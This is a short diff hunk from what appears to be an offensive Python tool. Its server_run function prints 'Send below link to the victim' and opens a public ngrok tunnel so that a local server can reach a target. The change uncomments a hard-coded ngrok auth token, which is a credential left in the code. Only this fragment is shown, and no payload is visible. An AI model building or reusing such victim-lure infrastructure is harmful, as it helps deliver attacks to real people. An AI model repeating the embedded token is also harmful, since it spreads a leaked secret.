@@ -171,7 +171,7 @@ def server_run(str_path, prt):
     # Star the server
     try:
         print(" [+] Send below link to the victim. ")
-        # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
+        conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
         url = ngrok.connect(PORT, "http")
         print(" [+] "+ str(url))
         time.sleep(3)
